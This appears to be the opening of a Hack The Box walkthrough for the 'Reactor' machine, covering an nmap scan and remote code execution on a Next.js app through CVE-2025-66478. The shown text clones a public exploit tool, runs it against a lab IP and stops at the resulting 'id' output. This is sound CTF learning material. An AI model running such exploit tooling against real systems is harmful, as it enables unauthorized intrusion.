# HTB-Reactor-(Season-11)
⚛️ Reactor — Hack The Box Walkthrough (Very Easy)
A complete walkthrough for the Reactor machine on Hack The Box, demonstrating reconnaissance, remote code execution via a vulnerable Next.js application, credential extraction, SSH access, and privilege escalation through the Node.js Inspector.

## 📌 Machine Information

| Category | Details |
|-----------|----------|
| Platform | Hack The Box |
| Machine Name | Reactor |
| Difficulty | Very Easy |
| OS | Linux |
| Vulnerabilities | CVE-2025-66478, Node.js Inspector Abuse |

## 🧭 Table of Contents

- [Reconnaissance](#-reconnaissance)
- [Initial Access — CVE-2025-66478](#-initial-access--cve-2025-66478)
- [Database Enumeration](#-database-enumeration)
- [Cracking the Hash](#-cracking-the-hash)
- [SSH Access](#-ssh-access)
- [Privilege Escalation — Node.js Inspector](#-privilege-escalation--nodejs-inspector)
- [Attack Chain Summary](#-attack-chain-summary)
- [Tools Used](#-tools-used)
- [Legal Disclaimer](#-legal-disclaimer)
- [Acknowledgments](#-acknowledgments)

## 🔍 Reconnaissance

```bash
nmap -sC -sV 10.129.8.62
```

### 📡 Open Ports

| Port | Service | Version |
|------|----------|----------|
| 22/tcp | SSH | OpenSSH 9.6p1 Ubuntu |
| 3000/tcp | HTTP | Next.js 15.0.3 |

The web application running on port 3000 is a Next.js dashboard used for monitoring a nuclear reactor.

---
### 🚪 Initial Access — CVE-2025-66478 (React2Shell)

```bash
python3 -m venv venv3
source venv3/bin/activate

git clone https://github.com/hackersatyamrastogi/react2shell-ultimate.git
cd react2shell-ultimate

pip3 install -r requirements.txt
```
### ✅ Verify Vulnerability

```bash
python3 react2shell-ultimate.py -u http://10.129.8.62:3000
```
### 💥 Execute Remote Command

```bash
python3 react2shell-ultimate.py \
-u http://10.129.8.62:3000 \
--mode rce \
--exec "id"
```

```bash
uid=999(node) gid=988(node) groups=988(node)
```


